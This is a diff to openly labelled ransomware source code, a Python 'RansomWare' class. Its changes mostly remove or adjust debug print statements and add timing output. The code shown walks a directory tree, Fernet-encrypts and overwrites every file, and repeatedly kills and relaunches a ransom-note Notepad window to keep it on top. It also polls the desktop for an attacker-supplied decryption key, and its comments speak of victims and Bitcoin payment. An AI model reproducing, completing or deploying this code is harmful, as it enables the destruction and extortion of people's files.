@@ -85,25 +85,18 @@ class RansomWare:
             # Read data from file.
             data = f.read()
             if not encrypted:
-                # Print file contents.
-                print(data)  # DEBUG
                 # Encrypt data from file.
                 _data = self.crypter.encrypt(data)
-                # Log that the file is encrypted and print encrypted contents.
-                print('[+] File encrypted.')  # DEBUG
-                print(_data)  # DEBUG
             else:
                 # Decrypt data from file.
                 _data = self.crypter.decrypt(data)
-                # Log that the file is decrypted and print decrypted contents.
-                print('[+] File decrypted.')  # DEBUG
-                print(_data)  # DEBUG
         with open(file_path, 'wb') as fp:
             # Write encrypted/decrypted data to file using same filename to overwrite original file.
             fp.write(_data)
 
     # [SYMMETRIC KEY] Fernet encrypt/decrypt system files using the symmetric key that was generated on victims machine.
     def crypt_system(self, encrypted=False):
+        print(f"Start time: {datetime.datetime.now()}")
         system = os.walk(self.localRoot, topdown=True)
         for root, dir, files in system:
             for file in files:
@@ -114,6 +107,7 @@ class RansomWare:
                     self.crypt_file(file_path)
                 else:
                     self.crypt_file(file_path, encrypted=True)
+        print(f"End time: {datetime.datetime.now()}")
 
     @staticmethod
     def what_is_bitcion():
@@ -162,11 +156,8 @@ If the payment is not made on time, the decryption key will be deleted and you w
         while True:
             time.sleep(0.1)
             top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
-            if top_window == 'RANSOM_NOTE - Notepad':
-                print('[!] Ransom note is the top window - do nothing.')  # DEBUG
-                pass
-            else:
-                print('[!] Ransom note is not the top window - kill and create process again.')  # DEBUG
+            if top_window != 'RANSOM_NOTE - Notepad':
+                print('[!] Ransom note is not the top window - kill and create process again.', end="\r", flush=True)  # DEBUG
                 # Kill the ransom note process so we can open it again and make sure it is in the foreground.
                 time.sleep(0.1)
                 ransom.kill()
@@ -185,7 +176,7 @@ If the payment is not made on time, the decryption key will be deleted and you w
         print('[!] Scan started.')  # DEBUG
         while True:
             try:
-                print('[!] Attempting to start decryption.')  # DEBUG
+                print('[!] Attempting to start decryption.', end="\r", flush=True)  # DEBUG
                 # The ATTACKER decrypts the Fernet symmetric key on their machine and then puts the un-encrypted Fernet-
                 # -key in this file and sends it in a email to the victim. They then put this on the desktop and it will be-
                 # -used to un-encrypt the system. WE DO NOT GIVE THEM THE PRIVATE ASSYEMTRIC KEY.
@@ -194,10 +185,10 @@ If the payment is not made on time, the decryption key will be deleted and you w
                     self.crypter = Fernet(self.key)
                     # Decrypt the system once the file is found and we have the crypter with the correct key.
                     self.crypt_system(encrypted=True)
-                    print('[+] Files decrypted.')  # DEBUG
+                    print('[!] Target machine has been un-encrypted.')  # DEBUG
                     break
             except Exception as e:
-                print(e)  # DEBUG
+                print(e, end="\r", flush=True)  # DEBUG
                 pass
             # Scan the desktop for the file every 10 seconds.
             time.sleep(10)  # DEBUG
@@ -226,7 +217,6 @@ def main():
     print('[!] Attack on target machine completed and the system is now encrypted.')  # DEBUG
     print('[!] Waiting for a document that will un-encrypt the machine.')  # DEBUG
     t2.start()
-    print('[!] Target machine has been un-encrypted.')  # DEBUG
 
 
 if __name__ == '__main__':
